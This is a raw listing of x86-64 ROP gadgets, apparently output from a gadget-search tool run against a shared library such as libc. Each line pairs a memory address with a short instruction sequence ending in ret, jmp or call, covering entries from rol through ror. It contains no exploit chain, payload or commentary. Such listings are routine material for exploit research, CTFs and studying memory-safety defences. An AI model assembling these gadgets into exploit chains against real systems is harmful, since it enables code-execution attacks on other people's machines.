0x00002aaaaab72f2e : rol byte ptr [rcx], 0xf ; mov esi, 0xd2840714 ; jne 0x9df33 ; ret
0x00002aaaaab73002 : rol byte ptr [rcx], 0xf ; mov esi, 0xf2390714 ; je 0x9e00b ; ret
0x00002aaaaab7ee4b : rol byte ptr [rcx], 0xf ; scasd eax, dword ptr [rdi] ; ret 0x74e9
0x00002aaaaab7ee36 : rol byte ptr [rcx], 0xf ; scasd eax, dword ptr [rdi] ; ret 0xaf0f
0x00002aaaaac5c420 : rol byte ptr [rcx], 1 ; jmp rax
0x00002aaaaac2202e : rol byte ptr [rcx], 1 ; ret 0x148
0x00002aaaaac60a14 : rol byte ptr [rcx], 1 ; sti ; jmp rax
0x00002aaaaac70d12 : rol byte ptr [rcx], 3 ; ret 0xe01
0x00002aaaaac90b18 : rol byte ptr [rcx], cl ; ret 0xa
0x00002aaaaac90ac0 : rol byte ptr [rcx], cl ; ret 0xb
0x00002aaaaabcae5c : rol byte ptr [rcx], cl ; ror byte ptr [rax + 0x39], 1 ; div dword ptr [rdi - 0x14] ; ret
0x00002aaaaabdeebd : rol byte ptr [rdi + rcx], 0xb7 ; ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaab80422 : rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaac5c4a4 : rol byte ptr [rdx + rsi*8], 0xff ; rol byte ptr [rdx + rsi*8], 1 ; jmp rax
0x00002aaaaac5c4a8 : rol byte ptr [rdx + rsi*8], 1 ; jmp rax
0x00002aaaaac6aa18 : rol byte ptr [rdx - 0x7baf0004], 1 ; cld ; call rax
0x00002aaaaac6a084 : rol byte ptr [rdx - 0x7daf0004], 0xfc ; jmp rax
0x00002aaaaab803d2 : rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaaaf68e6 : rol byte ptr [rdx], 0x50 ; call rbx
0x00002aaaaab80389 : rol byte ptr [rdx], 0xc3 ; nop dword ptr [rax] ; add rax, 1 ; ret
0x00002aaaaac79180 : rol byte ptr [rdx], 0xfd ; jmp rsp
0x00002aaaaabdb825 : rol byte ptr [rdx], 1 ; add byte ptr [rax], al ; pop rax ; pop rdi ; call rax
0x00002aaaaaba1677 : rol byte ptr [rdx], 1 ; add byte ptr [rax], al ; ret
0x00002aaaaac5c448 : rol byte ptr [rdx], 1 ; push rax ; add dh, dl ; call qword ptr [rax]
0x00002aaaaac413aa : rol byte ptr [rdx], cl ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaab93b3f : rol byte ptr [rip + 0x16e], 1 ; ret
0x00002aaaaabded8d : rol byte ptr [rip + 0x48c0b70f], 0x8b ; push rsp ; ret 0x8940
0x00002aaaaab40d99 : rol byte ptr [rip - 0x76b7ffee], 1 ; ret 0x8948
0x00002aaaaac6a9e4 : rol byte ptr [rsi - 0x77af0004], 1 ; cld ; call rax
0x00002aaaaac6a25c : rol byte ptr [rsi - 0x79af0004], 0xfc ; jmp rax
0x00002aaaaab80412 : rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaababe91 : rol byte ptr [rsp + rax*2], 0x29 ; ret 0x5089
0x00002aaaaac21e7d : rol ch, 1 ; jp 0x14cf0b ; jb 0x14ce6e ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac2236d : rol ch, 1 ; jp 0x14d3fb ; jb 0x14d35e ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac22710 : rol ch, 1 ; jp 0x14d79e ; jb 0x14d701 ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac56160 : rol cl, 0xc2 ; ret
0x00002aaaaac69764 : rol dh, 1 ; sti ; jmp qword ptr [rax]
0x00002aaaaabf14e7 : rol dh, 2 ; add byte ptr [rbp + 0x41], bl ; pop rsp ; pop r13 ; ret
0x00002aaaaac79660 : rol dl, 1 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaab8036c : rol dword ptr [rax + 0x1e740fe1], 1 ; ret
0x00002aaaaabe4fe1 : rol dword ptr [rax + 0x38], -0x3a ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaaad59ef : rol dword ptr [rax + 0x4260a120], cl ; ret 0x4021
0x00002aaaaac6bc0d : rol dword ptr [rax], 0 ; and al, 0xd4 ; in eax, dx ; jmp rsp
0x00002aaaaac7c07d : rol dword ptr [rax], 0 ; shl bl, 1 ; out dx, eax ; call rsp
0x00002aaaaab40cf8 : rol dword ptr [rax], 1 ; ret
0x00002aaaaab73517 : rol dword ptr [rbp + 0x317475c0], -0x40 ; ret
0x00002aaaaab734da : rol dword ptr [rbp + 0x7d850fc0], 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab68d39 : rol dword ptr [rbx + 0x634807e1], 1 ; or al, 0x88 ; add rax, rcx ; jmp rax
0x00002aaaaaaf49be : rol dword ptr [rbx + rbp*8], -0x34 ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2d957 : rol dword ptr [rbx], 0 ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab9a57b : rol dword ptr [rcx + 0xf], 0x49 ; fadd qword ptr [rcx] ; ret
0x00002aaaaab3b328 : rol dword ptr [rcx + rcx*2], -0x7d ; rol byte ptr [rax + rcx*2], 1 ; ret
0x00002aaaaaaf7d7b : rol dword ptr [rcx], 0 ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaab6b967 : rol dword ptr [rcx], 0x48 ; sub eax, 1 ; jne 0x9696a ; pop rbx ; pop rbp ; ret
0x00002aaaaab6b7cf : rol dword ptr [rcx], 0x48 ; sub esi, 1 ; jne 0x967d3 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabe6381 : rol dword ptr [rdi], cl ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab7c2b9 : rol dword ptr [rdi], cl ; add byte ptr [rax], al ; ret
0x00002aaaaac1e9c5 : rol dword ptr [rdx], 0 ; mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00002aaaaac1e991 : rol dword ptr [rdx], 0 ; mov edx, dword ptr [rcx + rdx*4] ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x00002aaaaabf83ae : rol dword ptr [rdx], 0x41 ; mov dword ptr [rax], edi ; mov qword ptr [r9], rcx ; ret
0x00002aaaaab0b0c5 : rol eax, cl ; and qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab5f8a9 : rol ebx, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab9d38b : rol ebx, 0x2f ; add byte ptr [rax - 0x77], cl ; ret 0x9ce9
0x00002aaaaac0bb88 : rol ecx, 1 ; jmp 0xffffffff80d662a4
0x00002aaaaac0be0f : rol ecx, 1 ; jmp 0xffffffff80d6652b
0x00002aaaaaad59ee : rol qword ptr [rax + 0x4260a120], cl ; ret 0x4021
0x00002aaaaab5f8a8 : rol r11d, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab0b0c4 : rol rax, cl ; and qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaabed7b2 : ror ax, 8 ; ret
0x00002aaaaab097de : ror byte ptr [rax + 0x21], 0xd0 ; sub rax, rdx ; shr rax, 0x3f ; ret
0x00002aaaaab0af64 : ror byte ptr [rax + 0x21], 1 ; add al, 0xd7 ; xor eax, eax ; ret
0x00002aaaaab0b0c6 : ror byte ptr [rax + 0x21], 7 ; xor eax, eax ; ret
0x00002aaaaab62fb2 : ror byte ptr [rax + 0x29], 0xc2 ; jbe 0x8dff9 ; add rax, rdi ; ret
0x00002aaaaab62fc2 : ror byte ptr [rax + 0x29], 0xc2 ; jbe 0x8dffb ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab62fd2 : ror byte ptr [rax + 0x29], 0xc2 ; jbe 0x8dffb ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaab62fe2 : ror byte ptr [rax + 0x29], 0xc2 ; jbe 0x8dffb ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaab5fd07 : ror byte ptr [rax + 0x29], 1 ; clc ; ret
0x00002aaaaab756de : ror byte ptr [rax + 0x29], 1 ; enter -0x2d7c, 0x74 ; cmp dh, dh ; ret 0x7501
0x00002aaaaab4942a : ror byte ptr [rax + 0x29], 1 ; ret
0x00002aaaaaaf8db6 : ror byte ptr [rax + 0x29], cl ; ret 0x8348
0x00002aaaaac101bd : ror byte ptr [rax + 0x39], 0xca ; je 0x13b1d7 ; ret
0x00002aaaaabd123f : ror byte ptr [rax + 0x39], 0xd7 ; ja 0xfc277 ; ret
0x00002aaaaabe8eb8 : ror byte ptr [rax + 0x39], 0xfa ; setae al ; ret
0x00002aaaaabcae5e : ror byte ptr [rax + 0x39], 1 ; div dword ptr [rdi - 0x14] ; ret
0x00002aaaaabcb0ed : ror byte ptr [rax + 0x39], 1 ; ret 0x3575
0x00002aaaaab1df16 : ror byte ptr [rax + 0x39], 1 ; ret 0x8949
0x00002aaaaabe8dd8 : ror byte ptr [rax + 0x48], 0x39 ; sal byte ptr [rdx - 0xf], 1 ; xor eax, eax ; ret
0x00002aaaaaba8400 : ror byte ptr [rax + 0x63], 4 ; xchg dword ptr [rax + 1], ecx ; clc ; jmp rax
0x00002aaaaab1bf15 : ror byte ptr [rax + 0xf], 0x44 ; ret
0x00002aaaaab90850 : ror byte ptr [rax + 0xf], 0x44 ; ret 0x8348
0x00002aaaaabe9ef2 : ror byte ptr [rax + 0xf], 0x44 ; ret 0x8948
0x00002aaaaabfd31c : ror byte ptr [rax + 0xf], 0x44 ; ret 0x8b4c
0x00002aaaaab6bdb7 : ror byte ptr [rax + 0xf], 1 ; ret
0x00002aaaaab1cfd5 : ror byte ptr [rax + 0xf], 1 ; ret 0x3145
0x00002aaaaab01864 : ror byte ptr [rax + 0xf], 1 ; ret 0x3949
0x00002aaaaab01855 : ror byte ptr [rax + 0xf], 1 ; ret 0x8b41
0x00002aaaaab1ea9e : ror byte ptr [rax + 0xf], 1 ; ret 0xf631
0x00002aaaaab73663 : ror byte ptr [rax + 1], 0xf8 ; add rax, r8 ; ret
0x00002aaaaab6a9fc : ror byte ptr [rax + 1], 0xf8 ; add rax, rcx ; ret
0x00002aaaaab618a9 : ror byte ptr [rax + 1], 0xf8 ; ret
0x00002aaaaabf8383 : ror byte ptr [rax + 1], 1 ; xlatb ; mov qword ptr [r9], rdi ; ret
0x00002aaaaab4bb99 : ror byte ptr [rax + 1], cl ; ret 0x8944
0x00002aaaaab83571 : ror byte ptr [rax + 1], cl ; ret 0x894c
0x00002aaaaab8c626 : ror byte ptr [rax + 1], cl ; ret 0x8b48
0x00002aaaaab17205 : ror byte ptr [rax + 1], cl ; ret 0x9a74
0x00002aaaaab82a15 : ror byte ptr [rax + 1], cl ; ret 0x9e74
0x00002aaaaab10fe5 : ror byte ptr [rax + 1], cl ; ret 0xa274
0x00002aaaaab10f29 : ror byte ptr [rax + 1], cl ; ret 0xe974
0x00002aaaaab5fd04 : ror byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x29], 1 ; clc ; ret
0x00002aaaaabb3c70 : ror byte ptr [rax + 9], 0x14 ; ret
0x00002aaaaac51428 : ror byte ptr [rax + rax], 0 ; ret
0x00002aaaaab63135 : ror byte ptr [rax - 0x2d], 0xfa ; movzx edx, dl ; sub eax, edx ; ret
0x00002aaaaab7ec9c : ror byte ptr [rax - 0x2f], 1 ; call 0xffffffffc30f29f8
0x00002aaaaab02902 : ror byte ptr [rax - 0x39], 1 ; ret 0xffff
0x00002aaaaabddb06 : ror byte ptr [rax - 0x3f], 0xe9 ; adc byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; ret 0xf48
0x00002aaaaab2c15a : ror byte ptr [rax - 0x3f], 1 ; clc ; add cl, byte ptr [rax + 0x29] ; ret
0x00002aaaaab94652 : ror byte ptr [rax - 0x46], 1 ; ret
0x00002aaaaab8fa48 : ror byte ptr [rax - 0x73], 0x14 ; add byte ptr [rax + 1], cl ; ret 0x8d48
0x00002aaaaabf379a : ror byte ptr [rax - 0x73], 0x15 ; sahf ; mov edx, 0x448b0006 ; ret 0x4804
0x00002aaaaaba2008 : ror byte ptr [rax - 0x73], 0x44 ; add bh, bh ; ret
0x00002aaaaab62f72 : ror byte ptr [rax - 0x73], 0x44 ; cmp al, dh ; ret
0x00002aaaaab62fa2 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], ah ; ret
0x00002aaaaab73552 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], dh ; ret
0x00002aaaaab62f92 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], dl ; ret
0x00002aaaaac39c03 : ror byte ptr [rax - 0x73], 0x76 ; adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x00002aaaaac39c3f : ror byte ptr [rax - 0x73], 0x76 ; adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaab75a50 : ror byte ptr [rax - 0x73], 0x76 ; adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret 0x13
0x00002aaaaab4e69d : ror byte ptr [rax - 0x73], 5 ; cmp edx, dword ptr [rax + 0xf480034] ; ret 0x8948
0x00002aaaaaba37dd : ror byte ptr [rax - 0x75], 0x54 ; ret
0x00002aaaaabde841 : ror byte ptr [rax - 0x75], 0x54 ; ret 0x8940
0x00002aaaaac00436 : ror byte ptr [rax - 0x75], 0x74 ; and al, 0x10 ; mov rdi, rbp ; call r14
0x00002aaaaab9a558 : ror byte ptr [rax - 0x75], 0x7c ; ret
0x00002aaaaab5dac3 : ror byte ptr [rax - 0x75], 1 ; push rdx ; or byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp - 0xd], cl ; ret
0x00002aaaaab50a0a : ror byte ptr [rax - 0x75], cl ; jmp rax
0x00002aaaaac6aa28 : ror byte ptr [rax - 0x75af0004], 1 ; cld ; call rax
0x00002aaaaab1ddb3 : ror byte ptr [rax - 0x77], 0x14 ; ret
0x00002aaaaab73199 : ror byte ptr [rax - 0x77], 0xa ; ret
0x00002aaaaac026b9 : ror byte ptr [rax - 0x77], 0xc3 ; jne 0x12d65b ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab1f6eb : ror byte ptr [rax - 0x77], 0xc7 ; mov byte ptr [rsi], dl ; jne 0x4a6e3 ; mov rax, rsi ; ret
0x00002aaaaab6bdb4 : ror byte ptr [rax - 0x77], 0xd0 ; cmove rax, rbx ; pop rbx ; ret
0x00002aaaaac071d8 : ror byte ptr [rax - 0x77], 0xd6 ; add rdi, 0x10 ; jmp rcx
0x00002aaaaabe9de2 : ror byte ptr [rax - 0x77], 0xe5 ; pop rbp ; ret
0x00002aaaaac0eb99 : ror byte ptr [rax - 0x77], 0xef ; add rbx, r12 ; call r14
0x00002aaaaab5c55c : ror byte ptr [rax - 0x77], 1 ; ret
0x00002aaaaac1444a : ror byte ptr [rax - 0x77], 1 ; ret 0x1be
0x00002aaaaab1035d : ror byte ptr [rax - 0x77], 1 ; ret 0x8966
0x00002aaaaab4df65 : ror byte ptr [rax - 0x77], 1 ; ret 0x8b48
0x00002aaaaab93645 : ror byte ptr [rax - 0x77], 1 ; ret 0x8d48
0x00002aaaaab27005 : ror byte ptr [rax - 0x77], 1 ; ret 0x92e8
0x00002aaaaac03d36 : ror byte ptr [rax - 0x77], 1 ; ret 0xd148
0x00002aaaaaaf5625 : ror byte ptr [rax - 0x77], 1 ; ret 0xe281
0x00002aaaaaba3343 : ror byte ptr [rax - 0x77], 1 ; sbb byte ptr [rcx + rcx*4 + 0x78], cl ; or byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab5b6f2 : ror byte ptr [rax - 0x77], 1 ; xor dword ptr [rax + 0xf], ecx ; scasd eax, dword ptr [rdi] ; ret 0x8948
0x00002aaaaac06809 : ror byte ptr [rax - 0x77], 2 ; mov eax, 1 ; ret
0x00002aaaaac10834 : ror byte ptr [rax - 0x77], 3 ; add rsp, 0x10 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaabd6980 : ror byte ptr [rax - 0x77], 3 ; setne al ; movzx eax, al ; pop rbx ; ret
0x00002aaaaabc40f1 : ror byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rbx ; call 0x3b3c9
0x00002aaaaab52b6d : ror byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x00002aaaaab4f391 : ror byte ptr [rax - 0x7b], 0xd2 ; jne 0x7a3a6 ; ret
0x00002aaaaabd68fb : ror byte ptr [rax - 0x7d], 0x3e ; add byte ptr [rsi + rax + 0x5b], dh ; ret
0x00002aaaaab4c3e2 : ror byte ptr [rax - 0x7d], 0x7f ; sbb byte ptr [rax], al ; setne al ; ret
0x00002aaaaab69921 : ror byte ptr [rax - 0x7d], 0xc1 ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaab0fdac : ror byte ptr [rax - 0x7d], 0xc4 ; adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac0f731 : ror byte ptr [rax - 0x7d], 0xc4 ; and byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac0b4e6 : ror byte ptr [rax - 0x7d], 0xc4 ; cmp byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaac0b26e : ror byte ptr [rax - 0x7d], 0xc4 ; jo 0x1362d5 ; ret
0x00002aaaaabccd70 : ror byte ptr [rax - 0x7d], 0xc4 ; movzx rax, al ; ret
0x00002aaaaabff40a : ror byte ptr [rax - 0x7d], 0xc4 ; or bl, al ; mov eax, 1 ; ret
0x00002aaaaab0fe41 : ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab0f08d : ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab4cfc7 : ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x00002aaaaac039f5 : ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1a3b4 : ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaac17a80 : ror byte ptr [rax - 0x7d], 0xc4 ; ret
0x00002aaaaab9fecd : ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaac07c1d : ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab40314 : ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x00002aaaaac0ef94 : ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; pop rbx ; pop rbp ; ret
0x00002aaaaac1076a : ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaac0f8cd : ror byte ptr [rax - 0x7d], 0xc4 ; sub byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaabf6626 : ror byte ptr [rax - 0x7d], 0xc4 ; sub byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab735b2 : ror byte ptr [rax - 0x7d], 0xea ; adc byte ptr [rax + 1], cl ; ret 0x147c
0x00002aaaaab73592 : ror byte ptr [rax - 0x7d], 0xea ; and byte ptr [rax + 1], cl ; ret 0x347c
0x00002aaaaab73572 : ror byte ptr [rax - 0x7d], 0xea ; xor byte ptr [rax + 1], cl ; ret 0x547c
0x00002aaaaabcb28e : ror byte ptr [rax - 0x7d], 0xec ; sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaab571e5 : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2916a04
0x00002aaaaab975e5 : ror byte ptr [rax - 0x7d], 1 ; ret
0x00002aaaaabb5116 : ror byte ptr [rax - 0x7d], 1 ; ret 0x4101
0x00002aaaaab24583 : ror byte ptr [rax - 0x7d], 1 ; ret 0x4820
0x00002aaaaabd1f25 : ror byte ptr [rax - 0x7d], cl ; clc ; add al, 0xf ; xchg eax, ebp ; ret 0xdaf7
0x00002aaaaab4af7a : ror byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xdaf7
0x00002aaaaab1b180 : ror byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaaba96c3 : ror byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab7a8c6 : ror byte ptr [rax - 0x7d], cl ; ret 0x4810
0x00002aaaaaafb489 : ror byte ptr [rax - 0x7d], cl ; ret 0x4906
0x00002aaaaab9329e : ror byte ptr [rax - 0x7d], cl ; ret 0x4c01
0x00002aaaaab4cccf : ror byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00002aaaaaafa93e : ror byte ptr [rax - 0x7d], cl ; ret 0xf01
0x00002aaaaab5f78b : ror byte ptr [rax - 0x7f], 0xc4 ; add byte ptr [rcx], al ; add byte ptr [rax], al ; sub rax, rdx ; ret
0x00002aaaaabd10fe : ror byte ptr [rax - 0x7f], 0xc4 ; cwde ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab0a8d1 : ror byte ptr [rax - 0x7f], 0xc4 ; mov byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00002aaaaab4d18a : ror byte ptr [rax - 9], cl ; cmc ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabebc2d : ror byte ptr [rax - 9], cl ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4d1cd : ror byte ptr [rax - 9], cl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabebd2a : ror byte ptr [rax - 9], cl ; pop rbx ; pop rbp ; ret
0x00002aaaaab8436a : ror byte ptr [rax], 0x83 ; ret 0x4801
0x00002aaaaab4c639 : ror byte ptr [rax], 0x89 ; mov byte ptr [r8 - 0x75], r9b ; or cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaab61c04 : ror byte ptr [rax], cl ; leave ; cmove rax, rdx ; ret
0x00002aaaaab8c9bb : ror byte ptr [rbp + 0x39], cl ; ret 0x4574
0x00002aaaaab814c7 : ror byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x20 ; call rbx
0x00002aaaaab7f1c6 : ror byte ptr [rbx + 0x42b8204], 0x8a ; je 0xaa1ba ; ret
0x00002aaaaabb8372 : ror byte ptr [rbx + 0x448d1314], 1 ; nop ; add al, 0xf ; xchg eax, esp ; ret 0x9848
0x00002aaaaabc50d6 : ror byte ptr [rbx + 0xf48246c], cl ; xchg eax, ebp ; ret
0x00002aaaaab3b58b : ror byte ptr [rbx + rax - 0x7e], 0x70 ; add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaac6aa30 : ror byte ptr [rbx - 0x72af0004], 1 ; cld ; call rax
0x00002aaaaaba1dda : ror byte ptr [rbx], 1 ; mov eax, 0xfde8 ; jne 0xccdb5 ; ret
0x00002aaaaabd4227 : ror byte ptr [rcx + 0x2c6f9235], cl ; add byte ptr [rax + rcx - 9], dh ; ret 0xfc07
0x00002aaaaabcb14f : ror byte ptr [rcx + 0x39], 1 ; ret 0x3375
0x00002aaaaaaf9c28 : ror byte ptr [rcx + 0x39], cl ; ret 0x1e76
0x00002aaaaaaf8dc5 : ror byte ptr [rcx + 0x39], cl ; ret 0x2576
0x00002aaaaaaf9270 : ror byte ptr [rcx + 0x39], cl ; ret 0x2876
0x00002aaaaab80e07 : ror byte ptr [rcx + 0x48c47503], 0x83 ; ret
0x00002aaaaabb4b36 : ror byte ptr [rcx + 0xc824bc], 0 ; add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x8488
0x00002aaaaab82fb3 : ror byte ptr [rcx + 0xf082444], 0x84 ; ret
0x00002aaaaab29d84 : ror byte ptr [rcx + rcx*4 + 0x2f], 0x5b ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabfee29 : ror byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rbp ; mov rcx, r13 ; call rbx
0x00002aaaaabfe72b : ror byte ptr [rcx + rcx*4 - 0xf], 0x4c ; mov edi, ebp ; call r12
0x00002aaaaab09f34 : ror byte ptr [rcx - 0x24efdbbc], 1 ; insb byte ptr [rdi], dx ; and al, 8 ; ret
0x00002aaaaab69386 : ror byte ptr [rcx - 0x39], cl ; ret
0x00002aaaaab0a22e : ror byte ptr [rcx - 0x3fcebfbd], 0x5b ; ret
0x00002aaaaab80e84 : ror byte ptr [rcx - 0x528bf7b9], 0x48 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaac6a9ec : ror byte ptr [rcx - 0x74af0004], 1 ; cld ; call rax
0x00002aaaaab6af38 : ror byte ptr [rcx - 0x75], cl ; xor al, 0x24 ; test rsi, rsi ; jne 0x95f57 ; jmp 0x95f11
0x00002aaaaabf745e : ror byte ptr [rcx - 0x76b7f3a9], 0x3e ; ret
0x00002aaaaabab2ee : ror byte ptr [rcx - 0x76bb79ec], 1 ; ret 0xeac1
0x00002aaaaab7ec94 : ror byte ptr [rcx - 0x77], 1 ; ret 0x2276
0x00002aaaaabf4071 : ror byte ptr [rcx - 0x7ca6873e], 0x3d ; ret
0x00002aaaaabca070 : ror byte ptr [rcx - 0x7cb7fbab], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab693c8 : ror byte ptr [rcx - 0x7d], 1 ; ret
0x00002aaaaab7a4af : ror byte ptr [rcx - 0x7d], 1 ; ret 0x4d10
0x00002aaaaab6defa : ror byte ptr [rcx - 0x7d], cl ; ret 0x8306
0x00002aaaaab80da0 : ror byte ptr [rcx - 0xc0c8af0], cl ; ret
0x00002aaaaab8f6a0 : ror byte ptr [rcx - 0xd8af1ec], cl ; ret
0x00002aaaaabdb97c : ror byte ptr [rcx], 0xf8 ; ret
0x00002aaaaab63979 : ror byte ptr [rdi + rcx + 0x47], 1 ; ret 0x894c
0x00002aaaaac6a9fc : ror byte ptr [rdi - 0x6eaf0004], 1 ; cld ; call rax
0x00002aaaaab1b064 : ror byte ptr [rdi], 0x1f ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0xc6 ; jmp qword ptr [rax]
0x00002aaaaab012bb : ror byte ptr [rdi], 0x1f ; add byte ptr [rcx + 0x29], cl ; ror dword ptr [rcx + 1], 1 ; ret 0x854d
0x00002aaaaac3fdbf : ror byte ptr [rdi], 0x28 ; fimul dword ptr [rcx - 0x7d] ; call 0xffffffffc39cbce4
0x00002aaaaac40e3f : ror byte ptr [rdi], 0x28 ; fimul dword ptr [rcx - 0x7d] ; call 0xffffffffc39ccd64
0x00002aaaaac259f5 : ror byte ptr [rdi], 0x29 ; pop rdi ; adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaabda3e0 : ror byte ptr [rdi], 0x44 ; ret 0x66c3
0x00002aaaaabd60b5 : ror byte ptr [rdi], 0x45 ; ret 0xc084
0x00002aaaaabbee00 : ror byte ptr [rdi], 0x47 ; ret 0x90c3
0x00002aaaaab91882 : ror byte ptr [rdi], 0x48 ; ret 0xb70f
0x00002aaaaab0f6f5 : ror byte ptr [rdi], 0x48 ; ret 0xc35b
0x00002aaaaabd1837 : ror byte ptr [rdi], 0x49 ; adc al, 0x24 ; add rsp, 0x18 ; mov eax, edx ; ret
0x00002aaaaac085da : ror byte ptr [rdi], 0x84 ; adc eax, 0x48ffffff ; mov edi, ebp ; call rax
0x00002aaaaab1c45f : ror byte ptr [rdi], 0x84 ; add al, 0 ; add byte ptr [rax - 0x77], cl ; ret 0x2948
0x00002aaaaab91e3d : ror byte ptr [rdi], 0x84 ; in al, dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab4a73c : ror byte ptr [rdi], 0x84 ; movsd dword ptr [rdi], dword ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac02756 : ror byte ptr [rdi], 0x84 ; out dx, al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, eax ; call qword ptr [rbx]
0x00002aaaaab6b4fa : ror byte ptr [rdi], 0x84 ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab5ca36 : ror byte ptr [rdi], 0x84 ; ret
0x00002aaaaabc8f87 : ror byte ptr [rdi], 0x84 ; ret 0xa
0x00002aaaaabb7d8f : ror byte ptr [rdi], 0x84 ; ret 0xfffd
0x00002aaaaab98e46 : ror byte ptr [rdi], 0x84 ; ret 1
0x00002aaaaab6b42a : ror byte ptr [rdi], 0x84 ; ret 2
0x00002aaaaab38693 : ror byte ptr [rdi], 0x84 ; ret 3
